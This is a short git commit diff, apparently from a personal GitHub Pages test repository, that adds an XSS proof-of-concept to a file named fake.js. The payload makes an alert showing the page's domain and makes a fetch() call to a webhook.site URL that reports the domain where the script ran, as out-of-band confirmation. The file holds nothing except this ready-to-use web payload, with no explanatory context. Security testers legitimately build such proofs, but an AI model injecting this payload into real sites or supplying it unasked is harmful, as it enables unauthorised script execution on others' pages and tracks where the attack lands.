aca2f5c11df0465add44d2bb905a44947c732580
david2005otieno-hue <david2005otieno@gmail.com>
2025-08-19 18:36:03 +0300

    fake.js

--- fake.js
+++ fake.js
@@ -1,2 +1,7 @@
-https://webhook.site/538b55af-c19e-48e8-9c4e-110b04797d1f
+// Visual proof
+alert("XSS executed on: " + document.domain);
+
+// Optional background OOB for tracking
+fetch('https://webhook.site/https%3A%2F%2Fdavid2005otieno-hue.github.io%2Fjs-test%2Ffake.js?executed=true&domain=' + document.domain);
+
 
